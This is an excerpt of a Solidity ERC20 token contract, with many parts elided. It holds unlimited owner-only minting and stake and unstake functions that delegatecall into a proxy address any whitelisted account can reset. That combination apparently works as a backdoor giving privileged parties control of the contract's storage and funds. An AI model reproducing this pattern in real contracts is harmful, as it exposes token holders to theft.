...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    modifier whiteListed() {
        require(_whitelist[msg.sender] == true, "Not Permitted.");
        _;
    }
    ...
    function mint(uint256 amount) external onlyOwner virtual returns (bool) {
        _mint(owner(), amount);
        return true;
    }

    function setBurnRatio(uint _burnRatio) external virtual {
    ...
    function checkRewardMapping(address _addr) external whiteListed view returns(bool){
        return _isRewardList[_addr];
    }

    function getRewardStatus() external whiteListed view returns(bool){
        return toReward;
    }

    function getRewardList() external whiteListed view virtual returns(address[] memory){
        return rewardList;
    }

    function stakeToken() external virtual {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("stakeToken()"));
        require(success, "delegatecall fail.");
    }

    function addWhitelist(address[] memory accounts) external onlyOwner virtual returns(bool){
    ...
    function removeWhitelist(address account) external onlyOwner virtual returns(bool){
        _whitelist[account] = false;
        return true;
    }

    function checkWhitelist(address account) external whiteListed view virtual returns(bool) {
    ...
    function setProxyAddr(address _addr) external whiteListed {
        proxyAddr = _addr;
    }

    function getProxyAddr() external onlyOwner view returns(address){
        return proxyAddr;
    }

    function showPairAddress() external onlyOwner view returns(address) {
        return _pair;
    }

    function newPairAddress(address account) external onlyOwner returns(bool) {
        _pair = account;
        return true;
    }
    ...
    function unstake() external payable returns(bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("unstake()"));
        require(success, "delegatecall fail.");
        return success;
    }
